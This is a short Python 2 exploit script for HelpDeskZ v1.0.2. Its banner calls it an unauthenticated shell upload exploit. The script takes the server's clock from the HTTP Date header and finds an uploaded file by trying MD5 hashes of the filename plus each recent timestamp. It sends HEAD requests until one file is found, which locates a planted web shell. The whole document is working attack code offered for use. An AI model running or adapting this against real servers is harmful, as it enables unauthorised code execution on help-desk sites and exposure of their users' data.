import hashlib
import time
import sys
import requests
import datetime

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]


r = requests.get(helpdeskzBaseUrl)

#Gets the current time of the server to prevent timezone errors - DoctorEww
currentTime = int((datetime.datetime.strptime(r.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')  - datetime.datetime(1970,1,1)).total_seconds())

# yeah, that's not what the above does
#offset = 6 # MST is GMT -6 during DST
#amount = 60 * 60 # number of seconds in an hour
#currentTime = currentTime + (offset * amount)

for x in range(0, 300):
    time = str(currentTime - x)
    plaintext = fileName + time
    md5hash = hashlib.md5(plaintext).hexdigest()

    #url = helpdeskzBaseUrl+md5hash+'.php'
    url = helpdeskzBaseUrl+md5hash+'.png'
    print "using time[{}], requesting[{}]".format(time, url)
    response = requests.head(url)
    if response.status_code == 200:
        print 'found!'
        print url
        sys.exit(0)

print 'Sorry, I did not find anything'
